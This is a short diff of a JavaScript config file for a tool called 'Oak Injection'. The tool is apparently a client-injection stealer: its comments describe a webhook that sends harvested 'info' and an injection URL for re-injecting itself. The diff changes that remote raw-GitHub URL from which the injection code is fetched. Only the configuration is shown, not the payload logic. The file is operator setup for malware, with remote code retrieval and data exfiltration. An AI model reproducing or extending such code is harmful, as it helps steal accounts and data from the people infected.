@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Oak Injection', //name of the webhook thats gonna send the info
   embed_icon: 'https://i.imgur.com/bbWgtHI.png', //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
   embed_color: 5639644, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
-  injection_url: 'https://raw.githubusercontent.com/j0taro/Oak-injection/main/Oak.js', //injection url for when it reinjects
+  injection_url: 'https://raw.githubusercontent.com/dreamyoak/Oak-injection/main/Oak.js', //injection url for when it reinjects
   /**
    * @ATTENTION DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING @ATTENTION
    **/
